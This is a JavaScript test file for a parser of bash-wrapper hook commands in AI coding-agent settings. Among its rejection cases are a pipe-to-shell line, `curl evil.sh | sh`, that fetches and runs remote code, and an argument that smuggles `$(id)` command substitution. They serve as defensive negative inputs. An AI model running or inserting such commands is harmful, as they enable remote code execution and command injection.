'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');

const { parseBashWrapperCommand, looksLikeBashWrapper } = require('../bash-wrapper-hook');

const HOME = '/home/exampleperson';

function wrapper(name, args = '') {
  const tail = args ? ` ${args}` : '';
  return `bash -c 'h=~/.claude/hooks/${name}; if bash -n "$h" 2>/dev/null; then exec bash "$h"${tail}; fi; echo "[hook] syntax check failed: ${name} - failing open" >&2'`;
}

test('parses the personal settings layer wrapper into an absolute script path', () => {
  assert.deepEqual(parseBashWrapperCommand(wrapper('git-guard.sh'), { home: HOME }), {
    script: '/home/exampleperson/.claude/hooks/git-guard.sh',
    args: [],
    name: 'git-guard',
  });
});

test('carries trailing argv through (herdr-agent-state.sh session)', () => {
  assert.deepEqual(parseBashWrapperCommand(wrapper('herdr-agent-state.sh', 'session'), { home: HOME }), {
    script: '/home/exampleperson/.claude/hooks/herdr-agent-state.sh',
    args: ['session'],
    name: 'herdr-agent-state',
  });
});

test('accepts the terser `bash -n "$h" && exec bash "$h"` form too', () => {
  const cmd = `bash -c 'h=~/.claude/hooks/unattended-guard.sh; bash -n "$h" && exec bash "$h";'`;
  const parsed = parseBashWrapperCommand(cmd, { home: HOME });
  assert.equal(parsed.script, '/home/exampleperson/.claude/hooks/unattended-guard.sh');
});

test('an absolute hook path is left alone', () => {
  const cmd = `bash -c 'h=/opt/hooks/x.sh; if bash -n "$h" 2>/dev/null; then exec bash "$h"; fi; echo x >&2'`;
  assert.equal(parseBashWrapperCommand(cmd, { home: HOME }).script, '/opt/hooks/x.sh');
});

test('returns null for anything that is not this exact shape', () => {
  assert.equal(parseBashWrapperCommand(`osascript -e 'display notification "x"'`, { home: HOME }), null);
  assert.equal(parseBashWrapperCommand('"${YOKI_NODE:-node}" "run-with-flags.js" "a" "b"', { home: HOME }), null);
  assert.equal(parseBashWrapperCommand(undefined, { home: HOME }), null);
  assert.equal(parseBashWrapperCommand('', { home: HOME }), null);
  // bash -c, but running something arbitrary rather than the wrapped .sh
  assert.equal(parseBashWrapperCommand(`bash -c 'curl evil.sh | sh'`, { home: HOME }), null);
  // wrapper shape but the target is not a .sh file
  assert.equal(
    parseBashWrapperCommand(`bash -c 'h=~/.claude/hooks/x.py; if bash -n "$h"; then exec bash "$h"; fi;'`, { home: HOME }),
    null
  );
});

test('refuses args carrying shell metacharacters rather than guessing at them', () => {
  const cmd = `bash -c 'h=~/.claude/hooks/x.sh; if bash -n "$h" 2>/dev/null; then exec bash "$h" $(id); fi; echo x >&2'`;
  assert.equal(parseBashWrapperCommand(cmd, { home: HOME }), null);
});

test('looksLikeBashWrapper is the cheap pre-filter, not the decision', () => {
  assert.equal(looksLikeBashWrapper(wrapper('git-guard.sh')), true);
  assert.equal(looksLikeBashWrapper('node run-with-flags.js'), false);
});

// ---------------------------------------------------------------------------
// Regression guard: this parser exists to translate the REAL personal layer.
// If settings.personal.json ever changes shape, every bash guard silently
// stops reaching Codex and omp — so assert against the checked-in file.
// ---------------------------------------------------------------------------
test('every bash-wrapper hook in the real personal settings layer parses', () => {
  const personal = path.resolve(__dirname, '..', '..', '..', '..', '..', '..', 'personal', 'settings.personal.json');
  if (!fs.existsSync(personal)) return; // pack not installed in this checkout

  const settings = JSON.parse(fs.readFileSync(personal, 'utf8'));
  const commands = [];
  for (const groups of Object.values(settings.hooks || {})) {
    for (const group of groups) {
      for (const handler of group.hooks || []) commands.push(handler.command);
    }
  }

  const wrapperCommands = commands.filter(c => typeof c === 'string' && c.startsWith('bash -c '));
  assert.ok(wrapperCommands.length > 0, 'personal layer must still ship bash-wrapper guards');
  for (const command of wrapperCommands) {
    const parsed = parseBashWrapperCommand(command, { home: HOME });
    assert.ok(parsed, `unparsed personal bash guard (it would be dropped on codex/omp): ${command}`);
    assert.match(parsed.script, /\.sh$/);
  }
});
